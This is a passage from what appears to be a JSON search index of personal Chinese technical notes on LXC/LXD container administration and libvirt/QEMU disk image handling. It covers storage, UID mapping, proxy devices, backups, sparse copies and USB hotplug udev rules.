volume\uff1a\u79fb\u52a8\u590d\u5236\u5230\u53e6\u4e00\u4e2a\u5b58\u50a8\u6c60\uff0c\u6216\u8005\u91cd\u547d\u540d<ul> <li><code>lxc storage volume copy &lt;source_pool_name&gt;/&lt;source_volume_name&gt; &lt;target_pool_name&gt;/&lt;target_volume_name&gt;</code></li> </ul> </li> <li>instance volume\uff08\u81ea\u52a8\u751f\u6210\u7684\uff09:\u4f7f\u7528 move \u547d\u4ee4\uff0c\u79fb\u52a8 instance \u5230\u53e6\u4e00\u4e2a\u5b58\u50a8\u6c60</li> </ul> <pre><code>lxc move &lt;instance_name&gt; --storage &lt;target_pool_name&gt;\n</code></pre> <p>\u5f53\u79fb\u52a8\u6216\u590d\u5236 volume \u5230\u4f7f\u7528\u4e0d\u540c driver \u7684\u5b58\u50a8\u6c60\u4e2d\uff0clxc \u4f1a\u81ea\u52a8\u8f6c\u6362\u3002</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7aef\u53e3\u8f6c\u53d1","title":"\u7aef\u53e3\u8f6c\u53d1","text":"<p>https://lxdware.com/forwarding-host-ports-to-lxd-instances/</p> <pre><code>lxc profile create proxy\nlxc profile edit proxy\n\ndevices:\n  proxy8096:\n    connect: tcp:127.0.0.1:8096\n    listen: tcp:0.0.0.0:8097\n    type: proxy\nname: proxy-jellyfin\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u8def\u5f84\u6620\u5c04\u6302\u8f7d","title":"\u8def\u5f84\u6620\u5c04\uff08\u6302\u8f7d\uff09","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7279\u6743-vs-\u975e\u7279\u6743","title":"\u7279\u6743 vs \u975e\u7279\u6743","text":"<p>\u7279\u6743\u5bb9\u5668\uff1a</p> <ul> <li>\u7279\u6743\u5bb9\u5668\u7684\u6240\u6709\u529f\u80fd\u57fa\u672c\u90fd\u53ef\u4ee5\u4f7f\u7528\u975e\u7279\u6743\u5bb9\u5668\u5b9e\u73b0\uff0c\u5e76\u4e0d\u662f\u66f4\u9ad8\u7ea7\u3002\u56e0\u6b64\u66f4\u63a8\u8350\u4f7f\u7528\u975e\u7279\u6743\u5bb9\u5668\uff0c\u66f4\u5b89\u5168</li> <li>\u5bb9\u5668\u5185\u7528\u6237 id \u548c\u5bb9\u5668\u5916\u7528\u6237 id \u4e00\u6837\u3002\u56e0\u6b64\u521b\u5efa\u6302\u8f7d\u540e\uff0c\u5373\u53ef\u6b63\u5e38\u4f7f\u7528\u3002</li> <li>\u5bb9\u5668\u5185 root \u7528\u6237\u5bf9\u5e94 host root \u7528\u6237</li> </ul> <p>\u975e\u7279\u6743\u5bb9\u5668</p> <ul> <li>\u5bb9\u5668\u5185 uid \u548c host uid \u5b58\u5728\u4e00\u5957\u4e00\u4e00\u6620\u5c04\u3002\u9ed8\u8ba4\u60c5\u51b5\u5bb9\u5668\u5185 0 \u5f00\u59cb\u7684 uid \u88ab\u6620\u5c04\u5230 host \u9ad8 uid(10000)</li> <li>\u6302\u8f7d\u540e\uff0c\u5bb9\u5668\u5185\u770b host \u521b\u5efa\u7684\u6587\u4ef6\u4e00\u822c\u4e3a nobody\uff0chost \u770b\u5bb9\u5668\u521b\u5efa\u7684\u6587\u4ef6\u4e3a 10000+\u3002</li> </ul> <ul> <li>Unprivileged containers are the safest containers. Those use a map of uid and gid to allocate a range of uids and gids to a container. That means that uid 0 (root) in the container is actually something like uid 100000 outside the container. So should something go very wrong and an attacker manages to escape the container, they'll find themselves with about as many rights as a nobody user.</li> </ul> <p>\u8bbe\u7f6e\u7279\u6743\u6216\u975e\u7279\u6743\u5bb9\u5668</p> <pre><code>lxc config set &lt;container_name&gt; security.privileged true\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6dfb\u52a0\u6620\u5c04","title":"\u6dfb\u52a0\u6620\u5c04","text":"<pre><code>lxc config device add {container-name} {name} disk source={/path/to/source/dir/} path={/path/to/dest/onto/container/}\n</code></pre> <p>\u79fb\u9664 (unmount)</p> <pre><code>lxc config device remove  {container-name} {name}\n</code></pre> <p>\u6216\u8005\u76f4\u63a5\u7f16\u8bd1\u914d\u7f6e\u6587\u4ef6</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u8bbe\u7f6e\u7528\u6237\u6620\u5c04","title":"\u8bbe\u7f6e\u7528\u6237\u6620\u5c04","text":"<p>lxd/userns-idmap.md at master \u00b7 lxc/lxd \u00b7 GitHub</p> <ul> <li>User namespaces work by mapping a set of UIDs and GIDs on the host to a set of UIDs and GIDs in the container.</li> <li>For example, we can define that the host UIDs and GIDs from 100000 to 165535 may be used by LXD and should be mapped to UID/GID 0 through 65535 in the container.</li> <li>As a result a process running as UID 0 in the container will actually be running as UID 100000.</li> <li>Allocations should always be of at least 65536 UIDs and GIDs to cover the POSIX range including root (0) and nobody (65534).</li> </ul> <ul> <li>On most hosts, LXD will check\u00a0<code>/etc/subuid</code>\u00a0and\u00a0<code>/etc/subgid</code>\u00a0for allocations for the\u00a0<code>lxd</code>\u00a0user and on first start, set the default profile to use the first 65536 UIDs and GIDs from that range.</li> <li>If none of those files can be found, then LXD will assume a 1000000000 UID/GID range starting at a base UID/GID of 1000000.</li> </ul> <ul> <li>lxd \u8bfb\u53d6/etc/{subuid, subgid}\u9009\u62e9 lxd \u53ef\u4ee5\u5206\u914d\u7684\u6bb5\u3002\u6ca1\u6709\u8be5\u6587\u4ef6\u7684\u8bdd\uff0c\u9ed8\u8ba4\u4ece 1000000 \u5f00\u59cb\u5206\u914d<ul> <li>\u6587\u4ef6\u683c\u5f0f\uff1auser:x:len\uff0c\u8868\u793a\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u7684\u7a7a\u95f4\u662f x-(x+len)\u3002</li> </ul> </li> </ul> <p>\u5c06\u7279\u5b9a\u5bb9\u5668\u5185\u7528\u6237\u6620\u5c04\u5230 host \u7528\u6237</p> <pre><code>uid 50-60 500-510  # 50-60 in host, map to, 500-510 in container\ngid 100000-110000 10000-20000\nboth 1000 1000  # both uid and gid\n\n# \u5f53\u524d\u7528\u6237\u6620\u5c04\u5230\u5bb9\u5668\u51851001\u7528\u6237\uff08ubuntu\u955c\u50cf\u6709\u9ed8\u8ba4\u7528\u6237ubuntu(1000)\uff0c\u81ea\u5df1\u65b0\u5efa\u7528\u6237\u4e00\u822c\u4e3a1001\uff09\necho -en \"uid $(id -u) 1001\\ngid $(id -g) 1001\" | lxc config set ubuntu20 raw.idmap -\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6dfb\u52a0-gpu","title":"\u6dfb\u52a0 gpu","text":"<pre><code>lxc config device add ubuntu20 gtx1080 gpu\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#profile","title":"profile","text":"<p>\u5177\u4f53\u89c1 jellyfin \u90a3\u7bc7\u6587\u7ae0</p> <p>lxc \u7684\u7aef\u53e3\u6620\u5c04\u6ca1\u6709\u90a3\u4e48\u76f4\u89c2\uff0c\u662f\u901a\u8fc7\u5728\u5bb9\u5668\u914d\u7f6e\u4e2d\u6dfb\u52a0 device \u5b9e\u73b0\u7684\u3002\u6709\u4e24\u79cd\u65b9\u5f0f\u7ed9\u8bbe\u5907\uff1a1\uff09\u901a\u8fc7<code>lxc config</code>\u7ed9\u5bb9\u5668\u6dfb\u52a0\u8bbe\u5907\uff08\u4e5f\u53ef\u4ee5<code>lxc config edit</code>\u76f4\u63a5\u4fee\u6539\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\uff092\uff09\u521b\u5efa profile\uff0c\u5e76\u7ed9\u5bb9\u5668\u6dfb\u52a0 profile\u3002 \u4e3a\u4e86\u4ee5\u540e\u77e5\u9053\u8bbe\u7f6e\u4e86\u54ea\u4e9b\u7aef\u53e3\u6620\u5c04\uff0c\u63a8\u8350\u4f7f\u7528 profile \u65b9\u5f0f\u3002</p> <pre><code>lxc profile device add &lt;profile&gt; &lt;device name&gt; &lt;device type&gt; &lt;key=value&gt;*\nlxc profile add &lt;container&gt; &lt;profile&gt;\n\nlxc config device add &lt;container&gt; &lt;device name&gt; &lt;device type&gt; &lt;key=value&gt;*\n</code></pre> <p>\u4f8b\u5b50\uff1a</p> <pre><code>lxc profile create proxy-jellyfin\nlxc profile device add proxy-jellyfin proxy8096 proxy connect=\"tcp:127.0.0.1:8096\" listen=\"tcp:0.0.0.0:8096\"\nlxc profile add ubuntu20 proxy-jellyfin\n</code></pre> <p>\u67e5\u770b\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6</p> <pre><code>lxc config show ubuntu20 --expanded\n\ndevices:\n  proxy8096:\n    connect: tcp:127.0.0.1:8096\n    listen: tcp:0.0.0.0:8097\n    type: proxy\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxc-\u521b\u5efa-openwrt-\u955c\u50cf","title":"lxc \u521b\u5efa openwrt \u955c\u50cf","text":"<p>makikiweb.com/Pi/lxc_openwrt.html</p> <ol> <li>Download the OpenWrt rootfs tarball</li> <li>Create a metadata.yaml file, and place into a tar file</li> <li>Import the rootfs tarball and metadata tarball to create an image</li> </ol> <p>\u5173\u4e8e\u67b6\u6784[OpenWrt Wiki] OpenWrt on x86 hardware (PC / VM / server)</p> <ul> <li>64\u00a0is for modern PC hardware (anything from around 2007 onward), it is built for 64-bit capable computers and has support for modern CPU features. Choose this unless you have good reasons not to.</li> <li>Generic\u00a0is for 32-bit-only hardware (either old hardware or some Atom processors), should be\u00a0i686\u00a0Linux architecture, will work on Pentium 4 and later. Use this only if your hardware can't run the 64-bit version.</li> <li>Legacy\u00a0is for very old PC hardware, Pentium MMX, what is called\u00a0i586\u00a0in Linux architecture support. It will miss a lot of features you want/need on modern hardware like multi-core support and support for more than 4GB of RAM, but will actually run on ancient hardware while other versions will not.</li> <li>Geode\u00a0is a custom Legacy target customized for Geode SoCs, which are still in use in many (aging) networking devices, like the older Alix boards from PCEngines.</li> </ul>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxd-dashboard","title":"lxd-dashboard","text":"<ul> <li>lxdware/dashboard - Docker Image | Docker Hub</li> </ul> <pre><code>---\nversion: \"2.1\"\nservices:\n  lxd-dashboard:\n    image: lxdware/dashboard:latest\n    container_name: lxd-dashboard\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Asia/Shanghai\n      - ADMIN_PASS=lxdware\n    volumes:\n      - /mnt/Disk2/lxdware:/var/lxdware\n    ports:\n      - 9002:80\n    restart: unless-stopped\n</code></pre> <pre><code>#lxd\u5f00\u542fhttp API\nlxc config set core.https_address [::]\n\n#\u4ece\u6d4f\u89c8\u5668\u590d\u5236\u8bc1\u4e66\u5230lxc host\nlxc config trust add lxdware.crt\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5907\u4efd","title":"\u5907\u4efd","text":"<p>Backup the container and install it on another server - LXD - Linux Containers Forum</p> <ul> <li>\u5c06\u4e00\u4e2a</li> </ul>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u65b9\u6cd5\u4e00\u538b\u7f29\u5305\u65b9\u5f0f","title":"\u65b9\u6cd5\u4e00\uff1a\u538b\u7f29\u5305\u65b9\u5f0f","text":"<p>\u5bb9\u5668\u5bfc\u51fa\u4e3a\u955c\u50cf\u6587\u4ef6</p> <pre><code>lxc snapshot blah backup\nlxc publish blah/backup --alias blah-backup\nlxc image export blah-backup .\nlxc image delete blah-backup\n</code></pre> <p>\u6062\u590d</p> <pre><code>lxc image import TARBALL-NAME --alias blah-backup\nlxc launch blah-backup some-container-name\nlxc image delete blah-backup\n</code></pre> <p>This is still pretty indirect and abusing the image mechanism to use it as a backup mechanism though. One alternative you could use is to just generate a tarball of /var/lib/lxd/containers/NAME and dump that on your NAS.</p> <p>Restoring that is a bit harder though. You\u2019ll need to create a /var/lib/lxd/storage-pools/POOL-NAME/containers/NAME path matching the name of the backed up container. Then if the storage pool is zfs or btrfs or lvm, you\u2019ll need to create the applicable dataset, subvolume or lv and mount it on /var/lib/lxd/storage-pools/POOL-NAME/containers/NAME and then unpack your backup tarball onto it. Lastly, you can call \u201clxd import NAME\u201d to have LXD re-import the container in the database.</p> <p>I\u00a0would add to this thread and suggest everyone to use by default no compression, especially if using ZFS compression. The images are fast. <code>lxc publish xenial/snap0 --compression none --alias export-xenial-snap0</code></p> <p>\u81ea\u52a8\u5907\u4efd\u6240\u6709\u5bb9\u5668\u811a\u672c https://discuss.linuxcontainers.org/t/backup-the-container-and-install-it-on-another-server/463/14</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u65b9\u6cd5\u4e8c\u7b2c\u4e8c\u4e2a-lxd-\u5c06\u7b2c\u4e00\u4e2a-lxd-server-\u4f5c\u4e3a\u6e90","title":"\u65b9\u6cd5\u4e8c\uff1a\u7b2c\u4e8c\u4e2a lxd \u5c06\u7b2c\u4e00\u4e2a lxd server \u4f5c\u4e3a\u6e90","text":"<p>\u5982\u679c\u4ec5\u662f\u60f3\u5728\u7b2c\u4e8c\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\u76f8\u540c\u7684\u5bb9\u5668\uff0c\u6709\u66f4\u7b80\u6d01\u7684\u65b9\u6cd5\u3002</p> <p>The cleanest and possibly easiest way to do so would be to add your second server as a remote with \u201clxc remote add\u201d. You\u2019ll then be able to just do</p> <pre><code>lxc copy CONTAINER_NAME/SNAPSHOT_NAME target:CONTAINER_NAME\"\n</code></pre> <p>And the target LXD will download the snapshot from the source LXD and then re-created the container with the exact same settings it had on the source.</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#zfs-container-\u76ee\u5f55\u4e3a\u7a7a","title":"zfs container \u76ee\u5f55\u4e3a\u7a7a","text":"<p>\u53ef\u4ee5\u76f4\u63a5\u5f3a\u884c\u6302\u8f7d\uff0c\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\u6587\u4ef6\u6743\u9650\u662f\u9519\u8bef\u7684\uff0c\u9700\u8981\u624b\u52a8\u4fee\u6539\u3002</p> <pre><code>mount -t zfs lxd/containers/mycontainer2 /xxx/mycontainer2\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>How to use Linux Containers with LXD, and why you might want to (robinwinslow.uk)</p> <ul> <li>ubuntu \u5b89\u88c5 LXC \u6559\u7a0b\uff1aHow To Install LXD on Ubuntu 20.04 LTS using apt - nixCraft (cyberciti.biz)</li> <li>\u5728\u6811\u8393\u6d3e\u4e0a\u4f7f\u7528 LXC: www.makikiweb.com/Pi/lxc_on_the_pi.html</li> </ul>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/","title":"libvirt","text":"<p>libvirt</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#virt-manger","title":"virt-manger","text":"<p>\u56fe\u5f62\u5316\u754c\u9762</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#virsh","title":"virsh","text":"<p>\u547d\u4ee4\u884c\u5de5\u5177</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u5bfc\u51fa\u865a\u62df\u673a\u914d\u7f6e\u5e76\u5b9a\u4e49\u65b0\u865a\u62df\u673a","title":"\u5bfc\u51fa\u865a\u62df\u673a\u914d\u7f6e\uff0c\u5e76\u5b9a\u4e49\u65b0\u865a\u62df\u673a","text":"<pre><code>virsh dumpxml &lt;domain&gt; &gt; file.xml\n\n#\u7f16\u8f91file.xml\u4e2d\u7684uuid\uff0c\u4e0d\u80fd\u548c\u5176\u5b83\u91cd\u590d\u3002\u518d\u7f16\u8f91name\nvirsh define file.xml\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#qemu-img","title":"qemu-img","text":"","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u590d\u5236-image\u590d\u5236\u7a00\u758f\u6587\u4ef6","title":"\u590d\u5236 image(\u590d\u5236\u7a00\u758f\u6587\u4ef6)","text":"<p>kvm virtualization - What is fastest way to copy a sparse file? What method results in the smallest file? - Server Fault</p> <p>Via cp - best speed</p> <pre><code>cp --sparse=always srcFile dstFile\nPerformance Notes:\n    Copied 200GB max/16GB actual VM as 200GB max/26GB actual, bloat: 10GB\n    Copy time: 1:02 (mm:ss) \n</code></pre> <p>Via dd - best overall performer</p> <pre><code>dd if=srcFile of=dstFile iflag=direct oflag=direct bs=4M conv=sparse\nPerformance Notes:\n    Copied 200GB max/16GB actual VM as 200GB max/21GB actual, bloat: 5GB\n    Copy time: 2:02 (mm:ss)\n</code></pre> <p>Via virt-sparsify - best size</p> <pre><code>virt-sparsify srcFile dstFile\n    Copied 200GB max/16GB actual VM as 200GB max/16GB actual, bloat: 0\n    Copy time: 17:37 (mm:ss)\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#cp","title":"cp","text":"<p><code>cp --sparse=always</code></p> <p>By  default,  sparse  SOURCE files are detected by a crude heuristic and the corresponding DEST file is made sparse as well.  That is the behavior selected by --sparse=auto.  Specify --sparse=always to create a sparse DEST file whenever the SOURCE file contains a long enough sequence of zero bytes.  Use --sparse=never to inhibit creation of sparse files.</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#virt-sparsify","title":"virt-sparsify","text":"<p>virt-sparsify (libguestfs.org)</p> <ul> <li>\u652f\u6301\u591a\u79cd\u6587\u4ef6\u7cfb\u7edf\u3002Virt-sparsify can locate and sparsify free space in most filesystems (eg. ext2/3/4, btrfs, NTFS, etc.), and also in LVM physical volumes.</li> <li>\u53ef\u4ee5\u5c06 raw \u683c\u5f0f\u8f6c\u6362\u4e3a qcow2 \u683c\u5f0f</li> </ul> <ul> <li>\u53d1\u73b0\u4e00\u4e2a\u4f18\u70b9\u540c\u65f6\u4e5f\u662f\u7f3a\u70b9\u3002virt-sparsify \u590d\u5236\u540e\u4f1a\u6e05\u9664\u73b0\u6709\u6587\u4ef6\u7684 0 \u5143\u7d20\uff0c\u4f7f\u5f97\u6587\u4ef6\u53d8\u5c0f\uff0c\u4f46\u540c\u65f6\u4e5f\u4f1a\u5bfc\u81f4 snapshot \u8bb0\u5f55\u6d88\u5931</li> </ul> <p>\u4f7f\u7528\u6ce8\u610f\uff1a</p> <ul> <li>\u4f7f\u7528\u524d\u5173\u95ed\u865a\u62df\u673a</li> <li>\u5728\u5220\u9664\u6e90\u955c\u50cf\u524d\u68c0\u67e5</li> <li>\u9700\u8981 2x \u7684\u7a7a\u95f4\uff081 tmp + 1 destination\uff09\uff08\u6700\u5dee\u60c5\u51b5\uff0c\u5b9e\u9645\u8fdc\u5c0f\u4e8e\u8be5\u503c\uff09<ul> <li>virt-sparsify \u2265 1.26 \u652f\u6301 in-place \u53c2\u6570\uff0c\u907f\u514d\u4e86\u5927\u91cf\u7a7a\u95f4\u7684\u4f7f\u7528\u3002</li> </ul> </li> </ul> <pre><code>sudo apt install guestfs-tools\nvirt-sparsify ori.img new.img\n</code></pre> <ul> <li>\u6307\u5b9a tmp \u76ee\u5f55\uff1a<code>--tmp my_tmp_folder</code>\u3002\u4e0d\u652f\u6301<code>--in-place</code></li> <li>\u663e\u793a\u66f4\u591a\u4fe1\u606f\uff1a<code>-v</code></li> </ul>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u590d\u5236\u8fdc\u7a0b-sparese-\u6587\u4ef6","title":"\u590d\u5236\u8fdc\u7a0b sparese \u6587\u4ef6","text":"<p>Sparse Files | Syed Ali</p> <p>scp\u2019 is not sparse aware and if you use scp to copy a file that is spare it will take up \u201cmore\u201d room on the destination host. Instead if you use rsync with -S option, spare files will be maintained as sparse.</p> <pre><code>rsync -aPS Tianyi:/mnt/Disk1/default.img Backup/\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u589e\u5927-image-\u5927\u5c0f","title":"\u589e\u5927 image \u5927\u5c0f","text":"<pre><code>qemu-img resize &lt;image&gt; +500G\n</code></pre> <p>\u7136\u540e\u5728 windows \u4e2d\u5206\u914d\u7a7a\u95f4</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u51cf\u5c0f-image-\u5927\u5c0f","title":"\u51cf\u5c0f image \u5927\u5c0f","text":"<p>\u8981\u590d\u6742\u4e00\u4e9b \u53c2\u8003\uff1aResizing KVM qcow2 images - mauBlog (maunium.net)</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#overlay","title":"overlay","text":"<pre><code>qemu-img create -f qcow2 -F qcow2 -b base.qcow2 overlay.qcow2\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u5408\u5e76-overlay","title":"\u5408\u5e76 overlay","text":"<p>\u53c2\u8003\uff1aQemu: Merge snapshot and backing file into standalone disk | by Praveen Kumar | Medium</p> <p>\u5982\u679c B \u7684 base \u662f A\uff0c\u5408\u5e76\u662f\u5c06 B \u5408\u5e76\u5230\u57fa\u955c\u50cf\u4e2d\u3002\u56e0\u6b64\u6700\u597d\u5907\u4efd\u57fa\u955c\u50cf\u3002</p> <pre><code>qemu-img commit overlay.qcow2\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u53d8\u57fa","title":"\u53d8\u57fa","text":"<pre><code>qemu-img rebase -F qcow2 -f qcow2 -b base.qcow2 overlay.qcow2\n</code></pre>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#convert","title":"convert","text":"<pre><code>qemu-img convert disk-life.qcow2 /mnt/VM-Pool/disk-life.raw\n</code></pre> <p>\u65f6\u95f4\u5de8\u957f\u300240G \u82b1\u4e86 30 \u5206\u949f\u3002\u5e76\u4e14\u671f\u95f4 zfs \u7684\u7cfb\u7edf\u65e0\u59a8\u4f7f\u7528\u3002</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#qemu-agent","title":"QEMU agent","text":"<p>\u7528\u4e8e\u63a7\u5236 windows \u865a\u62df\u673a\u5173\u673a\uff0c\u4f11\u7720 (domsuspend)</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>Qemu Guest Agent \u65b9\u5f0f\u5b9e\u73b0 libvirt \u4e0e\u865a\u673a\u4ea4\u4e92_HelloWuyp \u7684\u535a\u5ba2-CSDN \u535a\u5ba2_blacklist_rpc</li> <li>10.3.\u00a0Running the QEMU Guest Agent on a Windows Guest Red Hat Enterprise Linux 6 | Red Hat Customer Portal</li> </ul> <p>\u53c2\u8003\u7684\u90fd\u592a\u590d\u6742\u4e86\uff0c\u5b9e\u9645\u64cd\u4f5c\u5982\u4e0b\uff08\u8fd8\u6ca1\u9a8c\u8bc1\u6548\u679c\uff09\uff1a</p> <ul> <li>\u9a8c\u8bc1\u4e86\u6548\u679c\uff0c\u865a\u62df\u673a\u5173\u4e0d\u6389\uff0c\u4e00\u76f4\u5728 running\uff0c\u53ea\u80fd\u901a\u8fc7 virsh destory \u624d\u80fd\u5f3a\u884c\u5173\u6389\u3002</li> </ul> <p>windows \u865a\u62df\u673a\u5185\u4e0b\u8f7d\u5e76\u5b89\u88c5 https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-virtio/ https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-qemu-ga/</p> <p>virt-manger \u4e2d\u6dfb\u52a0 channel\uff0c\u9009\u62e9 qemu-agent\uff0c\u5176\u4f59\u4f1a\u81ea\u52a8\u914d\u7f6e</p>","tags":["KVM","libvirt","virsh","qemu"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/12/2022-11-12-libvirt/#\u70ed\u63d2\u62d4-usb","title":"\u70ed\u63d2\u62d4 usb","text":"<p>olavmrk/usb-libvirt-hotplug: Script to attach and detach USB devices from libvirt virtual machines based on udev rules. (github.com)</p> <p>udev: udev - ArchWiki (archlinux.org)</p> <ul> <li>udev(7) \u2014 Arch manual pages (archlinux.org)</li> </ul> <pre><code>ID_VENDOR_ID=0a12\nID_MODEL_ID=0001\n/devices/pci0000:00/0000:00:08.1/0000:0a:00.3/usb3/3-3/3-3.4 (usb)\n\nSUBSYSTEM==\"usb\",DEVPATH==\"/devices/pci0000:00/0000:00:1a.0/usb1/1-1/1-1.2\",RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh testvm-01\"\nSUBSYSTEM==\"usb\",ID_VENDOR_ID==\"0a12\",ID_MODEL_ID=\"0001\",RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n</code></pre> <pre><code>KERNEL==\"video[0-9]*\", SUBSYSTEM==\"video4linux\", SUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"1de1\", ATTRS{idProduct}==\"f105\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n# bluetooth\nSUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"0a12\", ATTRS{idProduct}==\"0001\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n# mouse\nSUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"30fa\", ATTRS{idProduct}==\"0400\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n# keyboard\nSUBSYSTEMS==\"usb\", ATTRS{idVendor}==\"1a81\", ATTRS{idProduct}==\"2039\", RUN+=\"/opt/usb-libvirt-hotplug/usb-libvirt-hotplug.sh win10\"\n</code></pre> <ul> <li>\u76d1\u542c usb \u8bbe\u5907<ul> 